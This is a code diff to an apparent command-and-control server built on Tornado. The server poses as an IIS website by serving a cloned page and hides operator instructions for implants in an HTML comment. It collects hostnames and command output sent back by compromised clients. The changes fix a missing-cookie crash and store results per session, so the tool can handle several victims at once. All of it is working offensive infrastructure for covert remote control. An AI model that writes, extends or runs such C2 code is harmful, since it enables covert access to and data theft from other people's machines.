@@ -225,8 +225,12 @@ class RPQ(tornado.web.RequestHandler):
         log.warning('Request to C2 Request Handler from {}'.format(remote_ip))
         self.set_header('Server', 'IIS')
         site_data = open("clone_site/index.html", "r").read()
-        sid = self.get_cookie(COOKIE_SESSIONID_STRING)
-        instructions = instructionsdict[sid]
+        if self.get_cookie(COOKIE_SESSIONID_STRING):
+            sid = self.get_cookie(COOKIE_SESSIONID_STRING)
+            instructions = instructionsdict[sid]
+        else:
+            instructions = ""
+            print("[!] Somebody without a cookie accessed the website from {}".format(remote_ip))
         site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (STUB, instructions))
         self.write(str(site_data))
 
@@ -269,7 +273,7 @@ class SPQ(tornado.web.RequestHandler):
         else:
             hostname = query_output.split("::::")[0]
             data = query_output.split("::::")[1]
-            with open("clone_site/received.txt", "w") as fh:
+            with open("clone_site/received_" + sid + ".txt", "w") as fh:
                 fh.write('=-=-=-=-=-=-=-=-=-=-=\n(HOSTNAME: {}\nCLIENT: {})\n{}'.format(hostname, remote_ip, str(data)))
             set_instruction(sid,"nothing")
 
@@ -414,12 +418,12 @@ if __name__ == "__main__":
                                 print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
                                 while 1:
                                     # we received a hit with our command
-                                    if os.path.isfile("clone_site/received.txt"):
-                                        data = open("clone_site/received.txt", "r").read()
+                                    if os.path.isfile("clone_site/received_" + sid + ".txt"):
+                                        data = open("clone_site/received_" + sid + ".txt", "r").read()
                                         print("[*] Received response back from client...")
                                         print(data)
                                         # remove this so we don't use it anymore
-                                        os.remove("clone_site/received.txt")
+                                        os.remove("clone_site/received_" + sid + ".txt")
                                         break
                                     time.sleep(.3)
                         else :
